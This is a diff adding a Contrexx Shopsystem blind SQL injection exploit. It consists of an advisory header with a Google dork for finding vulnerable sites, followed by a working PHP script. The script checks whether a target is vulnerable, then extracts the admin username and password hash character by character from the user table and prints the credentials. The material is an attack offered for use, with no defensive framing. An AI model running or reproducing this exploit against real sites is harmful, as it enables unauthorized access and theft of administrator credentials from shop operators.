@@ -1,0 +1,157 @@
+Exploit title: Contrexx Shopsystem Blind SQL Injection Exploit
+Exploit PoC: index.php?section=shop&productId=[VALID productid] and [YOUR BLIND SQL CODE]
+Exploit tested on: Debian 6, Ubuntu Linux 11.04
+Exploit found and written by: Penguin
+Version: =< 2.2 SP 3
+Date found: 12.8.11
+Dork: inurl:index.php?section=shop&productId=
+Vendor: www.contrexx.com
+Visit: www.null-sector.info
+Contact: Jabber -> penguin@null-sector.info
+
+#!/usr/bin/php
+<?php
+/*
+	Exploit title: Contrexx Shopsystem Blind SQL Injection Exploit
+	Exploit PoC: index.php?section=shop&productId=[VALID productid] and [YOUR BLIND SQL CODE]
+	Exploit tested on: Debian 6, Ubuntu Linux 11.04
+	Exploit found and written by: Penguin
+	Version: =< 2.2 SP 3
+	Date found: 12.8.11
+	Dork: inurl:index.php?section=shop&productId=
+	Vendor: www.contrexx.com
+	Visit: www.null-sector.info
+	Contact: Jabber -> penguin@null-sector.info
+	
+	Greets to: Blacktiger/Luxy, Leto, hAgBaRd2ooo, KrimiX, zYiix, reutz/head 
+	
+	Important info to this Exploit:
+		If you want to use it on a non-german site you have to edit the string in testIt "In den Warenkorb"!
+	Known Bugs:
+		-> Some servers response 500 - Internal Server Error. Dunno why :(
+		-> On non-german shops you must edit the function testIt. It does not fetch a keyword automatic :/
+ */
+ 
+echo "#######################################\r\n";
+echo "# Contrexx Shopsystem Exploit         #\r\n";
+echo "# Exploit Type: Blind SQL Injection   #\r\n";
+echo "# Exploit State: Non-Public           #\r\n";
+echo "# Programmed by: Penguin              #\r\n";
+echo "#######################################\r\n";
+if ($argc < 4)
+{
+	echo "USAGE: ./exploit.php [TARGET] [PRODUCTID] [ADMIN ROW]\r\n";
+	echo "Target = ex. http://demo.site/index.php\r\n";
+	echo "PRODUCTID = a VALID ProductId!\r\n";
+	echo "Admin Row = The Exploit selects all admins and use limit [ADMIN ROW],1. Standard: 0\r\n";
+} else {
+	// There are some Config variables :)
+	// If you know what you're doing, feel free to change them :>
+	$target_url = $argv[1] . "?section=shop&cmd=details&productId=" . $argv[2];
+	$charset_start_usr = 96;
+	$charset_end_usr = 126;
+	$charset_hash = Array(48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
+	$toLength = 100;
+	$myLimit = $argv[3];
+	
+	// Now the Action start :)
+
+	echo "Starting exploit....\r\nChecking if Vulnerable...";
+	$check = file_get_contents($target_url . "'");
+	if(testIt($check) == true)
+	{
+		die("Target is not Vulnerable :(\r\n");
+	}
+	echo "Target is Vulnerable :)\r\n";
+	echo "Starting the SQL Injection...\r\n";
+	echo "Fetching Username...\r\n";
+	$username = getUsername($toLength, $charset_start_usr, $charset_end_usr, $target_url,$myLimit);
+	$hash = getHash($toLength,$charset_hash,$target_url,$myLimit);
+	echo "Exploited Successfully!\r\n";
+	echo "Full Logindata: $username : $hash\r\n";
+	echo "Have fun ;)\r\n";
+}
+
+/////////////////////////////////////////
+
+//Functions - Sorry, code is a bit "ugly" :)
+function getUsername($toLength, $charset_start, $charset_end, $target_url,$limit)
+{
+	$username = "";
+	// Get Length
+	$length = -1;
+	for($i=0;$i<$toLength;$i++)
+	{
+		$url = $target_url . "/**/and/**/(select/**/length(username)/**/from/**/contrexx_access_users/**/where/**/is_admin/**/=/**/1/**/limit/**/$limit,1)=" . $i;
+		$src = file_get_contents($url);
+		if(testIt($src) == true)
+		{
+			$length = $i;
+			break;
+		}
+	}
+	if ($length == -1)
+	{
+		die("There was a problem @ fetching username length :(\r\n");
+	}
+	echo "Username length: $length !\r\n";
+	$username = "";
+	echo "Username: ";
+	for($k=0;$k<$length;$k++)
+	{
+		$charToAdd = "";
+		for($c=$charset_start;$c<$charset_end;$c++)
+		{
+			$p = $k+1;
+			$src = file_get_contents($target_url . "/**/and/**/substring((select/**/username/**/from/**/contrexx_access_users/**/where/**/is_admin/**/=/**/1/**/limit/**/$limit,1),$p,1)=char($c)");
+			if(testIt($src) == true)
+			{
+				$charToAdd = $c;
+				break;
+			}
+		}
+		echo chr($c);
+		$username .= chr($c);
+	}
+	echo "\r\n";
+	return $username;
+}
+
+function getHash($toLength, $charset, $target_url, $limit)
+{
+	// Get Hash
+
+	$hash = "";
+	echo "Hash: ";
+	for($k=0;$k<32;$k++)
+	{
+		$charToAdd = "";
+		for($c=0;$c<count($charset);$c++)
+		{
+			$p = $k+1;
+			$z = $charset[$c];
+			$src = file_get_contents($target_url . "/**/and/**/substring((select/**/password/**/from/**/contrexx_access_users/**/where/**/is_admin/**/=/**/1/**/limit/**/$limit,1),$p,1)=char($z)");
+			if(testIt($src) == true)
+			{
+				$charToAdd = $charset[$c];
+				break;
+			}
+		}
+		echo chr($charToAdd);
+		$hash .= chr($charToAdd);
+	}
+	echo "\r\n";
+	return $hash;
+}
+
+function testIt($src)
+{
+	$check = explode("In den Warenkorb",$src);
+	if(count($check) >= 2)
+	{
+		return true;
+	}
+	return false;
+}
+
+?>
